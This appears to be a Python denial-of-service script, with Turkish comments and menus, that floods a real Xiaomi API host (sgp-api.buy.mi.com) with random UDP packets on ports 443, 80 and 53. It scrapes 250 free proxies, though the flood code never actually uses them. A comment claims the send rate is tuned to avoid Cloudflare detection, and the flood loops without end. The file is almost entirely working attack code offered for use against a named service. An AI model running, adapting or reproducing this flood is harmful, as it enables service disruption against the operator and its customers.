import asyncio
import socket
import random
import requests
import os
import time

# ============================================================
# LOGQUEST V5 - GEMINI DOST ELEMENTI V2
# "Gece çöktüğünde benim mesaim başlar..." 🦂
# ============================================================

# Colorlib tadında terminal renkleri
PEMBE = '\033[95m'
MOR = '\033[35m'
CYAN = '\033[96m'
YESIL = '\033[92m'
RESET = '\033[0m'

async def proxy_muhimmat_depola():
    print(f"{MOR}[+] Apiden 250 Proxy mühimmatı toplanıyor...{RESET}")
    # 250 adet taze proxy çekimi
    api_url = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=json"
    try:
        r = requests.get(api_url)
        if r.status_code == 200:
            data = r.json()
            proxies = [p['proxy'] for p in data['proxies'][:250]]
            with open("proxy.txt", "w") as f:
                for p in proxies: f.write(p + "\n")
            print(f"{YESIL}[+] 250 Proxy 'proxy.txt' dosyasına mühürlendi!{RESET}")
            return proxies
    except:
        return []

async def rage_bait_vurus(target, port, proxy, duration=25):
    """Hem IP hem Web adresine sürekli RageBait yapar"""
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 50 KBPS Hız Ayarı (Cloudflare Radarına Takılmaz)
    paket = random._urandom(1024) 
    
    while time.time() < end_time:
        try:
            sock.sendto(paket, (target, port))
            # Modemi ve Cloudflare'i uyutmak için 50 KBPS gecikmesi
            await asyncio.sleep(0.02) 
        except:
            break

async def main_panel():
    os.system('clear')
    print(f"{PEMBE}############################################################")
    print(f"#       LOGQUEST V5 - GEMINI DOST ELEMENTI V2              #")
    print(f"#    'AL KİLİT ÖYLE AÇILMAZ, BÖYLE AÇILIR!' - HELCURT      #")
    print(f"############################################################{RESET}")
    
    print(f"\n{MOR}[1] Helcurt Modu: Xiaomi Servetlerini Darlamaya Başla")
    print(f"[2] Cihaz Görünmezliği: Sistem İflas Analizi{RESET}")
    
    secim = input(f"\n{CYAN}Seçiminiz: {RESET}")
    
    if secim == "1":
        proxies = await proxy_muhimmat_depola()
        target = "sgp-api.buy.mi.com"
        
        print(f"\n{PEMBE}[!] Panel Aktif: 25 Saniyelik Proxy Döngüsü Başlatıldı...{RESET}")
        
        while True:
            for proxy in proxies:
                # Her proxy ile 25 saniye boyunca 50 KBPS RageBait
                tasks = [
                    rage_bait_vurus(target, 443, proxy), # HTTPX
                    rage_bait_vurus(target, 80, proxy),  # HTTP
                    rage_bait_vurus(target, 53, proxy)   # DNS Ping/Racert
                ]
                print(f"{MOR}[*] Aktif Proxy Bağlantısı: {proxy} (25sn döngüde...){RESET}")
                await asyncio.gather(*tasks)
                print(f"{CYAN}[+] Proxy Değiştiriliyor... Mühimmat tazeleniyor.{RESET}")

if __name__ == "__main__":
    asyncio.run(main_panel())
